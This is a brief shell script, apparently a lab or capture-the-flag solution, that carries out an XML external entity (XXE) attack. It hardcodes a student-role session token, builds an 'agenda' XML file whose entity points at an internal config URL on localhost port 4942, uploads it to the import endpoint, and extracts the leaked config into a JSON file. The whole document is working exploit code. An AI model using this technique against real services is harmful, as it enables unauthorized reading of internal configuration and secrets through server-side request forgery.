#!/bin/sh

token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4bDE2dmJvaTQ3ZG1hbmQiLCJsb2dpbiI6ImJlbmphbWluIiwicm9sZSI6InN0dWRlbnQiLCJleHAiOjE3OTQyNTU0OTF9.5qNFxpmphZ-e1f-8gadI4FfcgVbsXWJW3_x0IBYcUCA"

cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE agenda [<!ENTITY xxe SYSTEM "http://localhost:4942/internal/config">]>
<agenda>
  <event>
    <title>&xxe;</title>
    <date>2042-01-15</date>
  </event>
</agenda>
EOF

curl -s -X POST http://localhost:4942/agenda/import \
  -H "Cookie: session=$token" \
  -F "file=@xxe.xml" \
  | grep -oP '(?<=td-primary">){.*?}(?=</td>)' \
  | python3 -c "import sys,html,json; print(json.dumps(json.loads(html.unescape(sys.stdin.read())), indent=2))" > data.json
